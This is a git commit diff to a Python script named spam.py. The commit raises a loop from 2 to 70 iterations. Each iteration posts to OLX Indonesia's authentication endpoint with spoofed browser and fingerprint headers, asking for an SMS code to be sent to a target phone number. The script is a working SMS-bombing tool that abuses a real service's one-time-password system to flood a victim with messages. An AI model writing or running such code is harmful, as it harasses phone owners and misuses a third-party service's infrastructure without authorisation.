32f4becd3c7f4e29efe9f0f9eb4501c3a619398c
mhmmd yusuf <89093200+syanzr18@users.noreply.github.com>
2021-08-18 01:29:13 +0700

    Update spam.py

--- spam.py
+++ spam.py
@@ -8,7 +8,7 @@ class nyepam:
 		self._8,self._08,self._62=_8,_08,_62
 	def mulai(self):
 		try:
-			for x in range(2):
+			for x in range(70):
 				send=req.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":self._62,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
 				if "ok" in send:continue
 				else:continue
